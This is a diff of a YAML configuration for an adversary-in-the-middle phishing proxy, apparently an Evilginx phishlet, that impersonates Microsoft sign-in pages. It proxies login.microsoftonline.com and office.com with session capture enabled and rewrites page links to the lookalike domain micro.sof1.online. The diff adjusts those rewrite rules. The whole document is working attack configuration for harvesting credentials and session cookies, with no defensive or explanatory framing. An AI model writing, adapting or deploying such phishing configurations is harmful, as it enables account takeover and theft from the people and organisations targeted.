@@ -5,11 +5,9 @@ redirect_url: 'https://login.microsoftonline.com'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  - {phish_sub: 'office', orig_sub: 'www', domain: 'micro.sof1.online', session: false, is_landing:false}
+
 sub_filters:
-  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'micro.sof1.online', search: 'https://www.micro.sof1.online/oauth', replace: 'https://login.micro.sof1.online/oauth', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'micro.sof1.online', search: 'https://login.microsoftonline.com', replace: 'https://login.micro.sof1.online', mimes: ['text/html', 'application/json', 'application/javascript']}
-#  - {triggers_on: 'www.micro.sof1.online', orig_sub: 'www', domain: 'micro.sof1.online', search: 'Location: https://www.micro.sof1.online/login', replace: 'Location: https://login.micro.sof1.online/login', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://login.micro.sof1.online', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
